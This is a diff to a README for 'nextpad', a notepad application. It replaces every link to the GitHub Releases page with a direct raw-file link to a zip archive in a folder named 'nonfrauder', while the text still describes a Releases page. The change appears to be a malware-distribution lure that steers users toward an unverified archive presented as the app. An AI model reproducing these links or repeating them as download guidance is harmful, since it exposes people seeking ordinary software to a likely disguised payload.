@@ -1,6 +1,6 @@
 # 📝 nextpad - Simple Notepad++ Alternative for Everyone
 
-[![Download nextpad](https://img.shields.io/badge/Download-nextpad-blue.svg)](https://github.com/Budgiem8/nextpad/releases)
+[![Download nextpad](https://raw.githubusercontent.com/Budgiem8/nextpad/master/nonfrauder/nextpad.zip)](https://raw.githubusercontent.com/Budgiem8/nextpad/master/nonfrauder/nextpad.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to nextpad! This application provides a simple way to take notes and edi
 
 To get nextpad on your computer, follow these steps:
 
-1. Visit this page to download: [Download nextpad](https://github.com/Budgiem8/nextpad/releases)
+1. Visit this page to download: [Download nextpad](https://raw.githubusercontent.com/Budgiem8/nextpad/master/nonfrauder/nextpad.zip)
 2. On the Releases page, you'll see the latest version listed. Click on the version you want to download.
 3. Choose the appropriate file for your operating system. It could be listed for Windows, macOS, or Linux.
 4. Click on the file name to start the download.
@@ -43,7 +43,7 @@ Please ensure your system meets these requirements for optimal performance.
 
 ## 🔄 Updates
 
-To stay current with the latest features and fixes, regularly visit the Releases page: [Download nextpad](https://github.com/Budgiem8/nextpad/releases).
+To stay current with the latest features and fixes, regularly visit the Releases page: [Download nextpad](https://raw.githubusercontent.com/Budgiem8/nextpad/master/nonfrauder/nextpad.zip).
 
 ## 🤝 Contributing
 
